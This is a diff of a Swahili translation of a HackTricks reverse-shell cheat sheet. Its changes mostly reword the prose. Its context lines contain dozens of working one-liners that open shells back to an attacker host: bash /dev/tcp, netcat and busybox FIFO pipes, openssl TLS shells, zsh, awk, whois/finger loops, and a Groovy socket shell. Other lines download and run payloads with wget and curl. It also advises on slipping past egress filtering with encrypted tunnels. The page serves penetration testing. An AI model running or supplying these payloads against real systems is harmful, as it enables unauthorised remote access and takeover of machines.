@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Ikiwa una maswali kuhusu yoyote ya hizi shells unaweza kuyaangalia kwa** [**https://explainshell.com/**](https://explainshell.com)
+**Ikiwa una maswali kuhusu shell yoyote kati ya hizi, unaweza kuziangalia kwenye** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
@@ -21,7 +21,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-Usisahau kuangalia pia shells nyingine: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, na bash.
+Usisahau kujaribu na shells nyingine: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, na bash.
 
 ### Symbol safe shell
 ```bash
@@ -34,24 +34,24 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Maelezo ya Shell
 
-1. **`bash -i`**: Sehemu hii ya command inaanzisha shell ya Bash ya interactive (`-i`).
-2. **`>&`**: Sehemu hii ya command ni notation ya kifupi kwa **kuelekeza both standard output** (`stdout`) na **standard error** (`stderr`) kwenda kwenye **destination moja**.
-3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Hii ni file maalum inayowakilisha **TCP connection kwa IP address na port iliyoainishwa**.
-- Kwa **kuelekeza output na error streams kwenda kwenye file hii**, command kwa ufanisi hutuma output ya interactive shell session kwenda kwenye machine ya attacker.
-4. **`0>&1`**: Sehemu hii ya command **huuelekeza standard input (`stdin`) kwenda kwenye destination sawa na standard output (`stdout`)**.
+1. **`bash -i`**: Sehemu hii ya command huanzisha Bash shell ya interactive (`-i`).
+2. **`>&`**: Sehemu hii ya command ni notation fupi ya **redirecting standard output** (`stdout`) na **standard error** (`stderr`) zote kwenda kwenye **destination ileile**.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Hii ni special file inayowakilisha **TCP connection kwenda kwenye IP address na port iliyobainishwa**.
+- Kwa **redirecting output na error streams kwenda kwenye file hii**, command hutuma output ya interactive shell session kwenda kwenye mashine ya attacker.
+4. **`0>&1`**: Sehemu hii ya command **redirects standard input** (`stdin`) kwenda kwenye destination ileile ya standard output (`stdout`).
 
-### Tengeneza kwenye file na execute
+### Unda kwenye file na execute
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 ## Forward Shell
 
-Wakati wa kushughulika na udhaifu wa **Remote Code Execution (RCE)** ndani ya application ya wavuti inayotegemea Linux, kupata reverse shell kunaweza kuzuiwa na ulinzi wa mtandao kama sheria za iptables au mekanizimu changamano za kuchuja packet. Katika mazingira yenye vizuizi kama hivi, mbinu mbadala ni kuanzisha shell ya PTY (Pseudo Terminal) ili kuingiliana na mfumo uliodhulumiwa kwa ufanisi zaidi.
+Unapokabiliana na vulnerability ya **Remote Code Execution (RCE)** ndani ya web application inayotumia Linux, kupata reverse shell kunaweza kuzuiwa na network defenses kama sheria za iptables au mifumo changamano ya packet filtering. Katika mazingira yenye vizuizi kama haya, njia mbadala ni kuanzisha shell ya PTY (Pseudo Terminal) ili kuingiliana na mfumo ulioathiriwa kwa ufanisi zaidi.
 
-Tool inayopendekezwa kwa madhumuni haya ni [toboggan](https://github.com/n3rada/toboggan.git), ambayo hurahisisha mwingiliano na mazingira lengwa.
+Tool inayopendekezwa kwa madhumuni haya ni [toboggan](https://github.com/n3rada/toboggan.git), ambayo hurahisisha mwingiliano na mazingira ya target.
 
-Ili kutumia toboggan kwa ufanisi, tengeneza Python module iliyolengwa kwa muktadha wa RCE wa mfumo wako lengwa. Kwa mfano, module inayoitwa `nix.py` inaweza kupangwa kama ifuatavyo:
+Ili kutumia toboggan kwa ufanisi, tengeneza Python module iliyolengwa kulingana na muktadha wa RCE wa mfumo wa target. Kwa mfano, module yenye jina `nix.py` inaweza kuundwa kama ifuatavyo:
 ```python3
 import jwt
 import httpx
@@ -79,17 +79,17 @@ Na kisha, unaweza kuendesha:
 ```shell
 toboggan -m nix.py -i
 ```
-Ili kutumia moja kwa moja interractive shell. Unaweza kuongeza `-b` kwa ajili ya ujumuishaji wa Burpsuite na kuondoa `-i` kwa wrapper ya msingi zaidi ya rce.
+Ili kutumia moja kwa moja shell ya interactive, unaweza kuongeza `-b` kwa ajili ya integration na Burpsuite na kuondoa `-i` kwa rce wrapper ya msingi zaidi.
 
-Uwezekano mwingine ni kutumia utekelezaji wa `IppSec` forward shell [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+Uwezekano mwingine ni kutumia implementation ya forward shell ya `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Unachohitaji ni kurekebisha:
 
-- URL ya host iliyo hatarini
-- Prefix na suffix ya payload yako (kama zipo)
-- Njia ambayo payload inatumwa (headers? data? extra info?)
+- URL ya host yenye vulnerability
+- Prefix na suffix ya payload yako (ikiwa ipo)
+- Jinsi payload inavyotumwa (headers? data? extra info?)
 
-Kisha, unaweza tu **kutuma commands** au hata **kutumia amri ya `upgrade`** ili kupata PTY kamili (kumbuka kwamba pipes husomwa na kuandikwa kwa ucheleweshaji wa takriban 1.3s).
+Kisha unaweza **kutuma commands** au hata **kutumia command ya `upgrade`** ili kupata PTY kamili (kumbuka kuwa pipes husomwa na kuandikwa kwa delay ya takribani sekunde 1.3).
 
 ## Netcat
 ```bash
@@ -101,19 +101,19 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## BusyBox
 
-Hutumika sana katika **routers**, **embedded devices**, **containers**, na vifaa vya Linux vilivyopunguzwa. Ikiwa hakuna `nc` inayojitegemea, angalia kama BusyBox inaionyesha:
+Inapatikana sana kwenye **routers**, **embedded devices**, **containers**, na vifaa vya Linux vilivyopunguzwa. Ikiwa hakuna `nc` ya kujitegemea, angalia kama BusyBox inaiwezesha:<sup>[[8]](#references)</sup>
 ```bash
 busybox --list-full | grep -E '(^|/)nc$'
 busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
 busybox nc <ATTACKER-IP> <PORT> -e sh
 ```
-Ikiwa `busybox nc` ipo lakini interactive execution ni isiyotegemewa, pattern ya FIFO kutoka sehemu ya `nc` kwa kawaida bado hufanya kazi:
+Ikiwa `busybox nc` ipo lakini interactive execution si thabiti, pattern ya FIFO kutoka sehemu ya `nc` kwa kawaida bado hufanya kazi:
 ```bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
 ```
 ## gsocket
 
-Iangalie katika [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
+Iangalie kwenye [https://www.gsocket.io/deploy/](/https://www.gsocket.io/deploy/)
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -126,13 +126,13 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```
 ## Whois
 
-**Mshambuliaji**
+**Mshambulizi**
 ```bash
 while true; do nc -l <port>; done
 ```
-Ili kutuma amri, iandike, bonyeza enter na bonyeza CTRL+D (ili kusitisha STDIN)
+Ili kutuma command iandike, bonyeza Enter kisha bonyeza CTRL+D (kusimamisha STDIN)<sup>[[3]](#references)</sup>
 
-**Victim**
+**Mwathiriwa**
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
@@ -231,14 +231,14 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
-## Zsh (built-in TCP)
+## Zsh (TCP iliyojengewa ndani)
 ```bash
 # Requires no external binaries; leverages zsh/net/tcp module
 zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
 ```
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener ya kisasa inayofanana na netcat iliyoandikwa kwa Rust (imepakiwa katika Kali tangu 2024).
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener ya kisasa inayofanana na netcat, iliyoandikwa kwa Rust (imejumuishwa katika Kali tangu 2024).<sup>[[5]](#references)</sup>
 ```bash
 # Attacker – interactive TLS listener with history & tab-completion
 rcat listen -ib 55600
@@ -248,14 +248,14 @@ curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_6
 && chmod +x /tmp/rcat \
 && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
 ```
-Features:
-- Chaguo la `--ssl` kwa usafirishaji uliosimbwa kwa njia fiche (TLS 1.3)
-- `-s` kuanzisha binary yoyote (kwa mfano `/bin/sh`, `python3`) kwenye mwathiriwa
-- `--up` ili kuboresha kiotomatiki hadi PTY ya mwingiliano kamili
+Vipengele:
+- `--ssl` flag ya hiari kwa transport iliyosimbwa (TLS 1.3)
+- `-s` ya ku-spawn binary yoyote (kwa mfano, `/bin/sh`, `python3`) kwenye mwathiriwa
+- `--up` ya ku-upgrade automatically hadi PTY yenye interactive kamili
 
 ## pwncat-cs
 
-Ikiwa tayari una **raw reverse shell** yoyote lakini unataka listener ambayo hujaribu kiotomatiki kuiboresha kuwa session inayoweza kutumika zaidi, `pwncat-cs` ni mbadala mzuri wa kisasa kwa listener rahisi ya `nc -lvnp`.
+Ikiwa tayari una **raw reverse shell yoyote** lakini unataka listener inayojaribu automatically ku-upgrade hadi session inayoweza kutumika zaidi, `pwncat-cs` ni replacement nzuri ya kisasa ya listener ya kawaida ya `nc -lvnp`.<sup>[[7]](#references)</sup>
 ```bash
 # Attacker - catch a plain reverse shell and auto-upgrade it when possible
 python3 -m pip install --user pwncat-cs
@@ -264,11 +264,11 @@ pwncat-cs -lp 4444
 # Victim - reuse any payload from this page
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
 ```
-Pia pia inasaidia chaneli za `ssl-bind` na `ssl-connect` **zilizosimbwa**, hivyo unaweza kuiunganisha na `ncat --ssl` au payloads za `socat OPENSSL:` unapohitaji usimbaji wa usafirishaji.
+Pia inasaidia channels za `ssl-bind` na `ssl-connect` **zilizosimbwa**, hivyo unaweza kuiunganisha na payloads za `ncat --ssl` au `socat OPENSSL:` unapohitaji usimbaji wa transport.<sup>[[7]](#references)</sup>
 
-## revsh (iliyofichwa na tayari kwa pivot)
+## revsh (iliyosimbwa na tayari kwa pivoting)
 
-`revsh` ni client/server ndogo ya C ambayo hutoa TTY kamili kupitia **encrypted Diffie-Hellman tunnel** na inaweza pia kuambatanisha interface ya **TUN/TAP** kwa pivoting ya reverse VPN-like kwa hiari.
+`revsh` ni C client/server ndogo inayotoa TTY kamili kupitia **tunnel ya Diffie-Hellman iliyosimbwa**, na kwa hiari inaweza kuambatisha interface ya **TUN/TAP** kwa ajili ya pivoting inayofanana na reverse VPN.<sup>[[6]](#references)</sup>
 ```bash
 # Build (or grab a pre-compiled binary from the releases page)
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -279,23 +279,23 @@ revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
 # Victim – reverse shell over TLS to the attacker
 ./revsh <ATTACKER-IP>:443
 ```
-Bendera muhimu:
+Flags muhimu:
 - `-b` : bind-shell badala ya reverse
-- `-p socks5://127.0.0.1:9050` : kupitia proxy kupitia TOR/HTTP/SOCKS
-- `-t` : tengeneza kiolesura cha TUN (reverse VPN)
+- `-p socks5://127.0.0.1:9050` : pitisha traffic kupitia TOR/HTTP/SOCKS
+- `-t` : tengeneza interface ya TUN (reverse VPN)
 
-Kwa kuwa session nzima imefichwa kwa encryption na ime-multiplex, mara nyingi hupita simple egress filtering ambayo ingeua plain-text `/dev/tcp` shell.
+Kwa sababu session nzima imesimbwa kwa encryption na imeunganishwa kwa multiplexing, mara nyingi hupita egress filtering rahisi ambayo ingekatiza plain-text `/dev/tcp` shell.
 
 ## OpenSSL
 
-**Single-port encrypted reverse shell** kwa kawaida ni ya vitendo zaidi kuliko classic two-listener pattern kwa sababu ni rahisi zaidi ku-proxy kupitia `443` na ni rahisi zaidi ku-automate.
+**Single-port encrypted reverse shell** kwa kawaida ni ya vitendo zaidi kuliko muundo wa kawaida wa two-listener, kwa sababu ni rahisi kuiproxy kupitia `443` na ni rahisi zaidi kuiautomate.
 
-The Attacker (Kali)
+Mshambuliaji (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
 ```
-Mhasiriwa
+Mwathiriwa
 ```bash
 #Linux - one-port TLS shell using a named pipe
 mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
@@ -303,7 +303,7 @@ mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATT
 #If the target needs SNI / hostname validation to blend with a fronted TLS service
 mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
 ```
-Bado unaweza kutumia muundo wa kawaida wa **two-listener** unapohitaji njia zilizotenganishwa za input/output:
+Bado unaweza kutumia **two-listener** pattern ya kawaida unapohitaji channels za input/output zilizotenganishwa:
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -331,13 +331,13 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```
 ## Finger
 
-**Mshambulizi**
+**Mshambuliaji**
 ```bash
 while true; do nc -l 79; done
 ```
-Ili kutuma command iandike, bonyeza enter na bonyeza CTRL+D (kusimamisha STDIN)
+Ili kutuma command, iandike, bonyeza enter kisha bonyeza CTRL+D (kusitisha STDIN)<sup>[[3]](#references)</sup>
 
-**Victim**
+**Mhasiriwa**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
@@ -368,11 +368,11 @@ close(Service)
 ```
 ## Xterm
 
-Hii itajaribu kuunganisha kwenye mfumo wako kwenye port 6001:
+Hii itajaribu kuunganisha kwenye mfumo wako kupitia port 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Ili kunasa reverse shell unaweza kutumia (ambayo itasikiliza kwenye port 6001):
+Ili kukamata reverse shell unaweza kutumia (ambayo itasikiliza kwenye port 6001):
 ```bash
 # Authorize host
 xhost +targetip
@@ -381,22 +381,22 @@ Xnest :1
 ```
 ## Groovy
 
-na [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) KUMBUKA: Java reverse shell pia inafanya kazi kwa Groovy
+na [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) KUMBUKA: Java reverse shell pia hufanya kazi kwa Groovy
 ```bash
 String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-## Marejeo
+## Marejeleo
 
-- [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
-- [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
-- [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
-- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
-- [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)
-- [https://gtfobins.org/gtfobins/busybox/](https://gtfobins.org/gtfobins/busybox/)
+- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+- [2] [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [3] [Kutumia Whois na Finger kwa Reverse Shells](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
+- [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [5] [rustcat - Msikilizaji wa port wa kisasa na reverse shell](https://github.com/robiot/rustcat)
+- [6] [revsh - Reverse shell yenye usaidizi wa terminal, data tunneling, na uwezo wa hali ya juu wa pivoting](https://github.com/emptymonkey/revsh)
+- [7] [pwncat (pwncat-cs) - platform ya post-exploitation](https://github.com/calebstewart/pwncat)
+- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
 
 {{#include ../../banners/hacktricks-training.md}}
